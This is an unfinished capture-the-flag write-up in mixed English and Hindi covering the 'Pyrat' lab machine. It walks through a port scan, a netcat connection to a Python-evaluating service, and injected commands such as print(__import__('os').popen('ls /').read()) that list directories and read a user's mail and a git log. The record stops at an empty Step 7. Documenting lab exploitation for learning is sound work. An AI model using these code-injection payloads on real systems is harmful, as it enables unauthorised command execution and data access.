# ctf-journey

# PYRAT CTF CHALLENGE

![image](https://github.com/idevyogi/ctf-journey/blob/1d2e7439ec3c447fea1c18a03770848f0baff211/Screenshot%202025-07-16%20164113.png)
![image](https://raw.githubusercontent.com/idevyogi/ctf-journey/5177707821f5c48910197600dc368d8e2d22ad02/PYRAT%20CTF%20CHALLENGE.png)

# Step 1 rustscan 

PORT        STATE       SERVICE       REASON

22/tcp      open         ssh         syn-ack ttl 60

8000/tcp    open      http-alt       syn-ack ttl 60

i cant go on ssh because i have zero information about credentials
so i browse port 8000 in fire fox browser

# Step 2 http://10.10.121.147:8000/
Try a more basic connection! 


TCP ya UDP connection banaana, jisme data end-to-end stream ke form me exchange hota hai — bina kisi extra formatting ke.

# Step 3  Usage of NETCAT for basic connection
nc <target_ip> <port>

(idevyogi㉿kali)-[~]
└─$ nc 10.10.121.147 8000
after this i got my cursor in next line and just blank theen i give hello nomral in it then it respond to me in this way
REASON OF HELLO -
✅ Agar reply milta hai, to samajh aata hai ki port alive aur responsive hai
hello
name 'hello' is not defined


# Step 4 as i know defined error is given in programming python so i try their code
print(1+1)
2
it works so now i will give input of python to retrieve information

# Step 5 i use python code for listed item 
print(__import__('os').popen('ls').read())

this not list file 

print(__import__('os').popen('ls /').read())
but this kist me item because from this ls /it give root directories files.
--  root directory listed in this way
bin
boot             # command   kya karti haii      KAB FAIL HO SKTI HAI
dev                  ls        CWD LIST KRNA      Agar inaccessible/empty hO
etc                  ls/       ROOT LIST KARNA     RARELY(ALWAYS ACCESIBLE)
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
swap.img
sys
tmp
usr
var
# Step 6 In this now i will explore various directories in point of veiw of flag
so now i explore var
print(__import__('os').popen('cat /var/mail/think').read())
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen

-- where i got this information
# Step 6 Now i go in the folder of the .git
print(__import__('os').popen('git --git-dir=/opt/dev/.git log').read())
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

--- where i got this type of information in this
Note - Now at this point i know some basic details which is in these two 

# Step 7 - 






